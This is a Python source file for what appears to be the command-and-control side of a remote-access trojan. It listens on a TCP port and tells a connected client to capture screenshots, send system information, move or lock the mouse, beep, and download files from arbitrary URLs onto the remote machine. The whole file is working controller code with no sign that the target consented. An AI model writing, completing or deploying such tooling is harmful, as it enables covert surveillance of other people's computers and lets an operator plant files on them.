#_*_ coding:utf-8 _*_

#
# python Controller
# fgfxf China HeNan Haust
#
import socket
import json
import struct
import sys

def PackLen(dwSize):
    #输入:长度
    #输出:可传送的struct字节流
    return bytes(struct.pack('i',dwSize))
    
def UnpackLen(len_data):
    #输入:struct打包
    #输出:int 长度
    recvLen=struct.unpack('i',len_data)
    return int(recvLen[0])

def BigReceive(sock,Totalsize):
    #大文件分块保存到内存
    #超大数据请不要用这个保存
    Total_data=b''
    tempnum=0
    while(tempnum<Totalsize):
        data=sock.recv(1024)
        tempnum+=len(data)
        print("\r", end="")#\r不带\n，后面一行的print
        print("Download progress: {}%: ".format(int(tempnum*100/Totalsize)), end="")
        sys.stdout.flush()
        sys.stdout.flush()
        Total_data+=data
    return Total_data

def BigFileReceive(filename,sock,Totalsize):
    #大文件分块保存到文件
    file=open(filename,'wb')    
    tempnum=0
    while(tempnum<Totalsize):
        data=sock.recv(1024)
        tempnum+=len(data)
        #print("接受到数据 "+ str(len(data)))
        print("\r", end="")
        print("Download progress: {}%: ".format(int(tempnum*100/Totalsize)), end="")
        sys.stdout.flush()
        file.write(data)
    file.close()
    
    
def screenshot(ConnSock,*args):
    ConnSock.send(PackLen(1));
    print("---------screenshot---------")
    len_data=ConnSock.recv(4)#接受4字节数据大小
    recvLen=UnpackLen(len_data)
    print("截图大小:"+str(recvLen))
    #保存文件
    fileName='screenshot.jpg'
    BigFileReceive(fileName,ConnSock,recvLen)
    
    return

def sysinfo(ConnSock,*args):    
    ConnSock.send(PackLen(2));
    print("---------sysinfo--------")
    len_data=ConnSock.recv(4)#接受4字节数据大小
    recvLen=UnpackLen(len_data)
    #接受全部数据
    sysData=BigReceive(ConnSock,recvLen)
    sysData = json.loads(sysData.decode('utf-8'))
    for i in sysData.keys():
        print(str(i)+ ' : '+str(sysData[i]))
        
def systeminfo(ConnSock,*args):
    ConnSock.send(PackLen(3));
    print("---------systeminfo--------")
    len_data=ConnSock.recv(4)#接受4字节数据大小
    recvLen=UnpackLen(len_data)
    #接受全部数据
    sysData=BigReceive(ConnSock,recvLen)
    sysData=sysData.decode('utf-8')
    print(sysData)
    
def mouse(ConnSock,*args):
    argStr=args[0]
    argStr=argStr.strip()#(去除两侧空格)
    #python do while
    
    while(True):
        lenArg1=len(argStr)
        argStr=argStr.replace('  ',' ')
        LenArg2=len(argStr)
        if(LenArg2 == lenArg1):
            break
    argList=argStr.split()
    if(len(argList) <2):
        print("usage: mouse <x> <y>")
        return
    print("---------mouse--------")
    ConnSock.send(PackLen(4));
    PosX=int(argList[0])
    ConnSock.send(PackLen(PosX));
    PosY=int(argList[1])
    ConnSock.send(PackLen(PosY));
    print("mouse send ok.")

def lockmouse(ConnSock,*args):
    print("---------lockmouse 10 s--------")
    ConnSock.send(PackLen(6));
    print("mouse lock 10 second ok.")

def Beep(ConnSock,*args):
    print("---------Beep--------")
    ConnSock.send(PackLen(5));

def close(ConnSock,*args):
    print("---------close--------")
    ConnSock.send(PackLen(99));
    ConnSock.shutdown(0)
    ConnSock.close()
    exit(0)

def wget(ConnSock,*args):
    argStr=args[0]
    argStr=argStr.strip()#(去除两侧空格)
    #python do while
    while(True):
        lenArg1=len(argStr)
        argStr=argStr.replace('  ',' ')
        LenArg2=len(argStr)
        if(LenArg2 == lenArg1):
            break
    argList=argStr.split()
    if(len(argList) <2):
        print("usage: wget <url> <name>")
        return
    ConnSock.send(PackLen(7));
    print("---------wget--------")
    print("download from "+str(argList[0])+" to "+str(argList[1]))
    url=bytes(argList[0].encode('utf-8'))
    ConnSock.sendall(PackLen(len(url)))
    ConnSock.sendall(url)
    
    name=bytes(argList[1].encode('utf-8'))
    ConnSock.sendall(PackLen(len(name)))
    ConnSock.sendall(name)

    
    
def default(ConnSock,*args):
    print("输入错误，请重新输入命令!")
    print(len(args[0]))
    
    print(args[0])
        #print("参数 "+str(i)+":"+ str(args[i]))

CommandList = {
    1:screenshot,
    2:sysinfo,
    3:systeminfo,
    4:mouse,
    5:Beep,
    6:lockmouse,
    7:wget,
    
    
    99:close
    }

def printCommand():
    #打印命令
    print(">>>>")
    for i in CommandList.keys():
        print(str(i),end=' : ')
        value = CommandList[i]
        value = str(value)
        start1=value.find('function')
        start2=start1+9
        end = value.find(' ',start2)
        print(value[start2:end])


if __name__ == '__main__':
    Host = '0.0.0.0'
    Port = 30663

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((Host,Port))
    s.listen(1)  #监听最大数量
    print("已经开启监听，等待连接"+Host+':'+str(Port))
    conn,addr= s.accept()#创建socket和客户端通信
    print("接受到:",addr)
    while(True):
        printCommand()
        Command=input("输入控制命令:")
        Command=Command.strip()# 去除空格
        flag1=Command.find(' ')
        if(flag1==-1):
            flag1=len(Command)
        cmd1=Command.split()
        if(cmd1[0].isdigit() == False):
            continue
        #多参数传递
        CommandList.get(int(Command[0:flag1]),default)(conn,Command[flag1:])#函数指针，命令分发https://www.cnblogs.com/yly123/p/15716863.html
        
    
